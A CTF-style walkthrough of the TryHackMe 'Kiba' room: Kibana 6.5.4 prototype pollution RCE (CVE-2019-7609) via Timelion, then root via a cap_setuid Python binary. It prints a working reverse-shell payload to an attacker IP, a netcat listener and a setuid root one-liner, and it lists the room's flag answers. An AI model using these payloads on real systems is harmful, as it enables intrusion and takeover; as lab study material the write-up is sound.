---
title: "Kiba"
description: "A beginner-friendly boot2root machine exploiting Kibana 6.5.4 prototype pollution RCE (CVE-2019-7609) via the Timelion visualizer, with privilege escalation through Linux capabilities on a custom Python binary."
difficulty: "Easy"
tags: ["Kibana", "CVE-2019-7609", "Prototype Pollution", "RCE", "Timelion", "Linux Capabilities", "GTFOBins"]
date: "2026-07-24"
---

## Overview

Kiba is a TryHackMe room that demonstrates two critical security concepts: prototype pollution in Kibana's Timelion visualizer leading to remote code execution, and Linux capabilities as a privilege escalation vector. The machine runs an ELK stack with Kibana 6.5.4, which is vulnerable to CVE-2019-7609. After gaining initial access as the `kiba` user, a Python binary with the `cap_setuid+ep` capability provides a direct path to root.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Skills Learned:** Kibana exploitation, prototype pollution, CVE-2019-7609, Linux capabilities

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -p- -oN nmap.txt <target-ip>
```

![Nmap scan results](/assets/screenshots/kiba/nmap.png)

Four open ports were discovered:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu |
| 80/tcp | HTTP | Apache httpd 2.4.18 |
| 5044/tcp | lxi-evntsvc | Logstash Beats |
| 5601/tcp | HTTP | Elasticsearch Kibana |

Port 5601 immediately stood out — Kibana is a data visualization dashboard for Elasticsearch, and older versions have known vulnerabilities.

### Web Enumeration

Port 80 hosted a simple Apache page with nothing interesting. The main attack surface was on port 5601:

![Kibana dashboard](/assets/screenshots/kiba/kibana_dashboard.png)

Navigating to the **Dev Tools** section and sending a `GET /` request revealed the Kibana version:

![Kibana version 6.5.4 via Dev Tools](/assets/screenshots/kiba/kibana_version.png)

The version was **6.5.4**, which falls within the vulnerable range for prototype pollution leading to RCE.

### Vulnerability Research

Searching for vulnerabilities in Kibana 6.5.4 led to **CVE-2019-7609**, a prototype pollution vulnerability in the Timelion visualizer. Prototype pollution is a JavaScript vulnerability specific to prototype-based inheritance languages. It allows an attacker to inject properties into an object's prototype chain, affecting all objects of that type.

The exploit works by injecting a malicious Timelion expression that manipulates the `__proto__` property to set environment variables. When Kibana spawns a new process (triggered by clicking the Canvas tab), the injected `NODE_OPTIONS` environment variable causes Node.js to execute arbitrary code.

## Initial Access — CVE-2019-7609

### Setting Up the Listener

Started a netcat listener on the attacking machine:

```bash
nc -lvnp 4444
```

### Injecting the Payload

Navigated to the **Timelion** visualizer tab in Kibana:

![Timelion visualizer](/assets/screenshots/kiba/timelion.png)

Pasted the exploit payload into the Timelion expression input, replacing the IP and port:

```javascript
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/<attacker-ip>/4444 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

The payload works by:
1. Using `.es(*)` to query all Elasticsearch data
2. Chaining `.props()` to manipulate the prototype chain via `label.__proto__.env`
3. Setting `AAAA` to a JavaScript snippet that executes a reverse shell command
4. Setting `NODE_OPTIONS` to `--require /proc/self/environ`, which causes Node.js to load the environment variables (including our injected `AAAA`) as a script

After clicking **Run** and then clicking the **Canvas** tab on the left panel, the reverse shell connected back:

![Reverse shell received](/assets/screenshots/kiba/rev_shell.png)

### User Flag

The shell was as the `kiba` user. The user flag was in the home directory:

```bash
kiba@ubuntu:~$ cat /home/kiba/user.txt
```

![User flag](/assets/screenshots/kiba/user_flag.png)

## Privilege Escalation

### Linux Capabilities Enumeration

Linux capabilities split root privileges into smaller, distinct units. Instead of granting full root access, specific capabilities can be assigned to binaries. The `getcap` command lists these capabilities:

```bash
getcap -r / 2>/dev/null
```

![getcap output showing capabilities](/assets/screenshots/kiba/getcap.png)

The output revealed a deliberately planted Python binary with a dangerous capability:

```
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
```

The `cap_setuid+ep` capability allows the binary to change the effective user ID of a process to any value. The `+ep` suffix means the capability is in the **effective** and **permitted** sets, meaning it is active and available.

### Exploiting cap_setuid

GTFOBins documents exactly how to abuse Python capabilities:

![GTFOBins Python capabilities technique](/assets/screenshots/kiba/gtfobins.png)

By setting the user ID to 0 (root's UID) and spawning a shell, full root access is obtained:

```bash
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Root Flag

```bash
whoami
root
cat /root/root.txt
```

![Root shell and root flag](/assets/screenshots/kiba/root_shell.png)

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/kiba/user.txt` | `THM{1s_easy_pwn3d_k1bana_w1th_rce}` |
| Root | `/root/root.txt` | `THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}` |

## Commands Used

```bash
# Nmap scan
nmap -sV -sC -p- -oN nmap.txt <target-ip>

# Listener for reverse shell
nc -lvnp 4444

# Timelion exploit payload (paste into Kibana Timelion)
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/<attacker-ip>/4444 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')

# Find capabilities on the system
getcap -r / 2>/dev/null

# Escalate to root via Python cap_setuid
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Get flags
cat /home/kiba/user.txt
cat /root/root.txt
```

## Lessons Learned

- **Prototype pollution is a JavaScript-specific vulnerability.** Languages with prototype-based inheritance allow modification of object prototypes through `__proto__`. Kibana's Timelion visualizer failed to sanitize user input before passing it to JavaScript's expression evaluator, enabling RCE through environment variable injection.
- **CVE-2019-7609 chains prototype pollution with Node.js features.** Setting `NODE_OPTIONS` to `--require /proc/self/environ` causes Node.js to load the process environment as a script. Combined with an injected environment variable containing malicious JavaScript, this creates a complete RCE chain.
- **The Timelion + Canvas trigger mechanism is clever.** The payload is submitted in Timelion, but the code doesn't execute until Kibana spawns a new process, triggered by clicking the Canvas tab. Understanding this execution flow is critical to successfully using the exploit.
- **Linux capabilities are powerful and dangerous.** The `cap_setuid` capability effectively grants the ability to become any user, including root. A single binary with this capability bypasses all other access controls. Always audit binaries with `getcap -r /` during post-exploitation.
- **GTFOBins documents capability-based escalation.** The Python `cap_setuid` technique is documented on GTFOBins and should be referenced whenever Python binaries with capabilities are found.
- **Hidden directories in home folders are worth investigating.** The `.hackmeplease` directory with a custom Python binary was clearly planted for the challenge, but in real engagements, look for unusual binaries with capabilities anywhere on the filesystem.
- **Version disclosure enables targeted attacks.** Kibana displayed its version number in the Dev Tools console output. This allowed precise identification of the vulnerable version without guesswork.

## References

- [TryHackMe — Kiba](https://tryhackme.com/room/kiba)
- [CVE-2019-7609 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-7609)
- [Tenable Blog — CVE-2019-7609 Exploit](https://www.tenable.com/blog/cve-2019-7609-exploit-script-available-for-kibana-remote-code-execution-vulnerability)
- [GTFOBins — Python Capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)
- [HackTricks — Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)
- [LandGrey CVE-2019-7609 Exploit (GitHub)](https://github.com/LandGrey/CVE-2019-7609)
- [Prototype Pollution — PortSwigger](https://portswigger.net/web-security/prototype-pollution)
- [Kibana — Elastic](https://www.elastic.co/kibana/)
